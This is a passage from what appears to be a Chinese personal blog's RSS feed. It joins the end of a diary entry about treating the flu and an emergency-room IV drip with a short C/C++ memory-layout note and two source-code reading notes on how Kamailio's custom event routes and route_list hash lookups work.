&lt;p&gt;银耳莲子羹还不错，我都个喝完了。&lt;/p&gt;
&lt;p&gt;吃饱喝足，顺便我把医生给我开的药也吃了，我起身离开，刚走到餐桌不到2米， 就瞥见那个大叔匆匆走向我的餐桌。&lt;/p&gt;
&lt;h1 id=&#34;急诊室&#34;&gt;急诊室&lt;/h1&gt;
&lt;p&gt;我吃完饭，回到家，每隔一个小时测一次体温，体温很稳定，稳定在38度左右。&lt;/p&gt;
&lt;p&gt;一直到晚上，我的体温还是没怎么下降。&lt;/p&gt;
&lt;p&gt;老婆给我打电话，说让我赶紧去急诊，去输液，光吃药效果不好，高烧不退会要人命的。 但是我觉得没必要，因为尽然发热门诊的医生都没有让我输液，说明我不需要输液，或者说输液也没有多大作用。&lt;/p&gt;
&lt;p&gt;老婆说：&amp;ldquo;你想让我中年丧夫吗？&amp;rdquo;&lt;/p&gt;
&lt;p&gt;我无话可说，只能默默穿上衣服，带上口罩，去了早上那家医院的急诊。&lt;/p&gt;
&lt;p&gt;晚上9点急诊室人来人往，络绎不绝，仿佛是白天的门诊。 我挂上号，接着又等了将近1个小时，终于等到我了。&lt;/p&gt;
&lt;p&gt;给我看病的是位女医生。&lt;/p&gt;
&lt;p&gt;”医生，我在你们医院发生门诊早上就看过了，诊断是甲流，药也吃了，到现在还是38度，还是给我输液吧。“，我说&lt;/p&gt;
&lt;p&gt;”甲流不是一天两天能好的，至少要发热三天，而且输液效果也不大“，医生说&lt;/p&gt;
&lt;p&gt;“那我也烧了两天了，再烧下去人要烧没了。你给我开个输液的吧”&lt;/p&gt;
&lt;p&gt;“好的吧，那我就给你开一次输液，你看看效果”&lt;/p&gt;
&lt;p&gt;一顿拉扯，我终于能输液了。其实输的也不是什么特殊的东西，就是一带左氧和一袋维C。&lt;/p&gt;
&lt;p&gt;输完液，已经晚上11点50，叫了车，回到家里。感觉嘴巴好苦，还好家里有甜的冰糖心苹果。&lt;/p&gt;
&lt;p&gt;我啃完第一个苹果，每一口都是苦味。接着我再啃一个苹果，每一口都还是苦味。 如果不是因为发烧，我简直立即想去吃点火锅底料漱漱口。&lt;/p&gt;
&lt;h1 id=&#34;归梦&#34;&gt;归梦&lt;/h1&gt;
&lt;p&gt;睡觉前，我又量了一次体温。体温恢复到37度，看起来正常正常了。&lt;/p&gt;
&lt;p&gt;我不知道这是吃药起的效果还是输液的效果。&lt;/p&gt;
&lt;p&gt;但是两盒药的价格是270，其中一盒西药50，另一盒重要220。&lt;/p&gt;
&lt;p&gt;输液呢，一袋左氧+维C，总共也不过才30。&lt;/p&gt;
&lt;p&gt;让我想起了电影《大腕》的名言&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20241231231011072&#34; loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2024/the-edn-day/atta/image-20241231231011072.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20241231231118484&#34; loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2024/the-edn-day/atta/image-20241231231118484.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;31号&#34;&gt;31号&lt;/h1&gt;
&lt;p&gt;这是24年的最后一天，美丽的烟花在天空中绽放璀璨的光芒。&lt;/p&gt;
&lt;p&gt;有些人觉得烟花美丽，有些人只觉得吵。&lt;/p&gt;</description>
    </item>
    <item>
      <title>CPU眼里的C/C&#43;&#43;</title>
      <link>https://wdd.js.org/books/006-cpu%E7%9C%BC%E9%87%8C%E7%9A%84c-c-plus/</link>
      <pubDate>Sat, 28 Dec 2024 19:00:00 +0800</pubDate>
      <guid>https://wdd.js.org/books/006-cpu%E7%9C%BC%E9%87%8C%E7%9A%84c-c-plus/</guid>
      <description>&lt;h1 id=&#34;内存布局&#34;&gt;内存布局&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;堆和栈之前有大片的空白虚拟内存空间，用多少映射多少&lt;/li&gt;
&lt;li&gt;堆和栈是像相反的方向增长&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image-20241228193129302|200&#34; loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/books/006-cpu%E7%9C%BC%E9%87%8C%E7%9A%84c-c-plus/atta/image-20241228193129302.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>源码笔记 - 自定义事件路由(中)</title>
      <link>https://wdd.js.org/kamailio/route-list-action/</link>
      <pubDate>Sat, 28 Dec 2024 09:43:00 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/route-list-action/</guid>
      <description>&lt;p&gt;[[&lt;em&gt;TOC&lt;/em&gt;]]&lt;/p&gt;
&lt;h1 id=&#34;route_list&#34;&gt;route_list&lt;/h1&gt;
&lt;p&gt;route.h定义了几个函数分别用来获取、查找、新增route&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// src/core/route.h
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;route_get&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; route_list &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;rt, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;name);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;route_lookup&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; route_list &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;rt, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;name);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; action &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; action &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;head);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; route_list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; action &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;rlist;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; idx;					 &lt;span style=&#34;color:#75715e&#34;&gt;/* first empty entry */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; entries;				 &lt;span style=&#34;color:#75715e&#34;&gt;/* total number of entries */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; str_hash_table names; &lt;span style=&#34;color:#75715e&#34;&gt;/* name to route index mappings */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;rlist&#34;&gt;rlist&lt;/h2&gt;
&lt;p&gt;我们对route_list数据模型进行简化:&lt;/p&gt;
&lt;p&gt;rlist是一个固定长度的一维数组，通过索引来访问对应的值。如果数组的空间不足，那么就创建一个两倍大的空数据，然后先把原始数据复制过去。这种复制方式保持的原始数据的索引位置。有点像golang的切片扩容机制。&lt;/p&gt;
&lt;p&gt;这里最为重要的就是保持数组元素的索引位置在扩容后不变。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;inline&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;route_new_list&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; route_list &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;rt)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ret;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; action &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;tmp;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;entries) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 两倍扩容
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pkg_realloc&lt;/span&gt;(rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;rlist, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;entries &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; action &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(tmp &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;LM_CRIT&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;out of memory&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; end;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;/* init the newly allocated memory chunk */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;memset&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tmp[rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;entries], &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;entries &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; action &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;rlist &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;entries &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;entries) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;idx;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		rt&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;idx&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;end:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ret;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;str_hash_table&#34;&gt;str_hash_table&lt;/h2&gt;
&lt;p&gt;我们对hash_table的数据模型进行简化，它其实就是一hash表，key是路由的名，值是一个正数，正数代表了路由执行单元的索引位置。&lt;/p&gt;</description>
    </item>
    <item>
      <title>源码笔记 - 自定义事件路由(上)</title>
      <link>https://wdd.js.org/kamailio/customer-event-route/</link>
      <pubDate>Fri, 27 Dec 2024 20:45:03 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/customer-event-route/</guid>
      <description>&lt;p&gt;[[&lt;em&gt;TOC&lt;/em&gt;]]&lt;/p&gt;
&lt;h1 id=&#34;事件路由简介&#34;&gt;事件路由简介&lt;/h1&gt;
&lt;p&gt;在某些模块中，我们看到有一些模块自定义的事件路由。&lt;/p&gt;
&lt;p&gt;例如dispatcher模块，或者rtpengine模块。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;event_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dispatcher:dst-down&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_ERR&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Destination down: &lt;/span&gt;$rm&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt; (&lt;/span&gt;$du&lt;span style=&#34;color:#e6db74&#34;&gt;)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;event_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rtpengine:dtmf-event&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_INFO&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;callid: &lt;/span&gt;$avp&lt;span style=&#34;color:#e6db74&#34;&gt;(dtmf_event_callid)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_INFO&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;source_tag: &lt;/span&gt;$avp&lt;span style=&#34;color:#e6db74&#34;&gt;(dtmf_event_source_tag)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_INFO&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;timestamp: &lt;/span&gt;$avp&lt;span style=&#34;color:#e6db74&#34;&gt;(dtmf_event_timestamp)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_INFO&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dtmf: &lt;/span&gt;$avp&lt;span style=&#34;color:#e6db74&#34;&gt;(dtmf_event)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;disapcher模块&#34;&gt;disapcher模块&lt;/h1&gt;
&lt;p&gt;在dispatch.c文件中，我们看到如下代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ds_skip_dst&lt;/span&gt;(old_state) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ds_skip_dst&lt;/span&gt;(idx&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;dlist[i].flags)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;ds_run_route&lt;/span&gt;(msg, address, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dispatcher:dst-down&amp;#34;&lt;/span&gt;, rctx);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;ds_skip_dst&lt;/span&gt;(old_state) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ds_skip_dst&lt;/span&gt;(idx&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;dlist[i].flags))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;ds_run_route&lt;/span&gt;(msg, address, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dispatcher:dst-up&amp;#34;&lt;/span&gt;, rctx);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ds_run_route还是定义在dispatch.c文件中，&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ds_run_route&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;sip_msg_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;msg, str &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;uri, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;route, &lt;span style=&#34;color:#66d9ef&#34;&gt;ds_rctx_t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;rctx)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接着又一个重要调用。 这里似乎在查找路由。&lt;/p&gt;
&lt;p&gt;route这个参数其实就是&lt;strong&gt;dispatcher:dst-down&lt;/strong&gt;， 或者 &lt;strong&gt;dispatcher:dst-up&lt;/strong&gt;，&lt;/p&gt;
&lt;p&gt;那么event_rt又是什么鬼呢？&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;route_lookup&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;event_rt, route);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;event_rt是一个route_list的结构体&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// route.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; route_list event_rt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;route_list的结构如下，重点是这个str_hash_table这个字段，它似乎是一个hash&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; route_list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; action &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;rlist;
